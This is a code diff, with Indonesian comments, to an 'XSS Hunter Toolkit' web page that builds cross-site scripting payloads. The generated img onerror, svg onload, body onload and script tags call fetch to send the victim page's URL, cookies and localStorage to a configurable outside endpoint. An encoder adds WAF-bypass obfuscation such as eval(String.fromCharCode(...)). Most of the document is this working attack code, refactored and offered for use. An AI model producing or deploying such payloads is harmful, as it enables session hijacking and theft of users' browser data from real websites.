@@ -111,7 +111,7 @@
     <h1>🕵️ XSS Hunter Toolkit</h1>
     <div class="sub">Payload Generator + WAF Bypass + Real-time Dashboard</div>
 
-    <!-- Bagian 1: Konfigurasi Endpoint -->
+    <!-- Bagian 1: Konfigurasi Hunter -->
     <div class="card">
         <h2>⚙️ Konfigurasi Hunter</h2>
         <label>Endpoint Vercel (API Hook)</label>
@@ -158,7 +158,7 @@
                 <label>Metode Encoding</label>
                 <select id="encodeMethod">
                     <option value="none">Tanpa encoding</option>
-                    <option value="html">HTML Entity (&#x3C;script>)</option>
+                    <option value="html">HTML Entity (&#x3C;script&gt;)</option>
                     <option value="url">URL Encode</option>
                     <option value="unicode">Unicode Escape (\\u003c)</option>
                     <option value="hex">Hex String</option>
@@ -185,7 +185,7 @@
 </div>
 
 <script>
-    // Elemen
+    // Elemen DOM
     const endpointInput = document.getElementById('endpoint');
     const markerInput = document.getElementById('marker');
     const payloadType = document.getElementById('payloadType');
@@ -195,56 +195,53 @@
     const encodeMethod = document.getElementById('encodeMethod');
     const encodedOutputDiv = document.getElementById('encodedOutput');
 
-    // Helper: build URL endpoint dengan marker dan data
-    function buildEndpointUrl(extraData = '') {
-        let base = endpointInput.value.trim();
-        if (!base) return '';
-        let marker = markerInput.value.trim();
-        let urlParam = `marker=${encodeURIComponent(marker)}&url=${encodeURIComponent(window.location.href)}`;
-        if (extraData) urlParam += '&' + extraData;
-        return `${base}?${urlParam}`;
-    }
-
-    // Generate payload berdasarkan tipe
+    // Fungsi generate payload
     function generatePayload() {
-        const type = payloadType.value;
-        const data = dataOption.value;
         let hookUrl = endpointInput.value.trim();
         let marker = markerInput.value.trim();
         if (!hookUrl) {
             generatedPayloadDiv.innerText = '❌ Isi endpoint dulu!';
             return;
         }
-        // buat base url dengan marker dan url dinamis (window.location.href akan di-encode di payload)
-        let baseWithMarker = `${hookUrl}?marker=${marker}&url=` + (data !== 'basic' ? "'+encodeURIComponent(window.location.href)+'" : 'window.location.href');
-        if (data === 'cookies') baseWithMarker += `&cookies='+encodeURIComponent(document.cookie)+'`;
-        if (data === 'all') baseWithMarker += `&cookies='+encodeURIComponent(document.cookie)+'&localStorage='+encodeURIComponent(JSON.stringify(localStorage))+'`;
+        const type = payloadType.value;
+        const data = dataOption.value;
+
+        // Bikin URL dasar dengan marker dan URL dinamis
+        let basePayloadUrl = `${hookUrl}?marker=${encodeURIComponent(marker)}&url=`;
+        if (data === 'basic') {
+            basePayloadUrl += `'+encodeURIComponent(window.location.href)+'`;
+        } else if (data === 'cookies') {
+            basePayloadUrl += `'+encodeURIComponent(window.location.href)+'&cookies='+encodeURIComponent(document.cookie)+'`;
+        } else {
+            basePayloadUrl += `'+encodeURIComponent(window.location.href)+'&cookies='+encodeURIComponent(document.cookie)+'&localStorage='+encodeURIComponent(JSON.stringify(localStorage))+'`;
+        }
 
         let payload = '';
         switch(type) {
             case 'img':
-                payload = `<img src=x onerror="fetch('${baseWithMarker}')">`;
+                payload = `<img src=x onerror="fetch('${basePayloadUrl}')">`;
                 break;
             case 'script_src':
-                payload = `<script src="${hookUrl}?marker=${marker}&url=${window.location.href}"></script>`;
+                payload = `<script src="${hookUrl}?marker=${encodeURIComponent(marker)}&url="+encodeURIComponent(window.location.href)+""></script>`;
                 break;
             case 'fetch':
-                payload = `<script>fetch('${hookUrl}?marker=${marker}&url='+encodeURIComponent(window.location.href)${data !== 'basic' ? `+'&cookies='+encodeURIComponent(document.cookie)` : ''})</script>`;
+                payload = `<script>fetch('${basePayloadUrl}')</script>`;
                 break;
             case 'body':
-                payload = `<body onload="fetch('${baseWithMarker}')">`;
+                payload = `<body onload="fetch('${basePayloadUrl}')">`;
                 break;
             case 'svg':
-                payload = `<svg/onload="fetch('${baseWithMarker}')">`;
+                payload = `<svg/onload="fetch('${basePayloadUrl}')">`;
                 break;
-            default: payload = '';
+            default:
+                payload = '';
         }
         generatedPayloadDiv.innerText = payload;
-        // juga set ke rawPayload untuk encoder
+        // Isi otomatis ke textarea raw payload buat encoder
         rawPayloadText.value = payload;
     }
 
-    // Encode payload
+    // Fungsi encode payload
     function encodePayload() {
         let raw = rawPayloadText.value;
         if (!raw) {
@@ -279,7 +276,8 @@
                 let charCodes = raw.split('').map(c => c.charCodeAt(0)).join(',');
                 encoded = `<script>eval(String.fromCharCode(${charCodes}))</script>`;
                 break;
-            default: encoded = raw;
+            default:
+                encoded = raw;
         }
         encodedOutputDiv.innerText = encoded;
     }
@@ -294,6 +292,8 @@
         if (text && text !== 'Pilih tipe payload...') {
             navigator.clipboard.writeText(text);
             alert('Payload disalin!');
+        } else {
+            alert('Belum ada payload. Pilih tipe payload dulu.');
         }
     });
     document.getElementById('encodeBtn').addEventListener('click', encodePayload);
@@ -308,7 +308,8 @@
         window.location.href = '/dashboard.html';
     });
 
+    // Generate awal
     generatePayload();
 </script>
 </body>
-                  </html>
+                    </html>
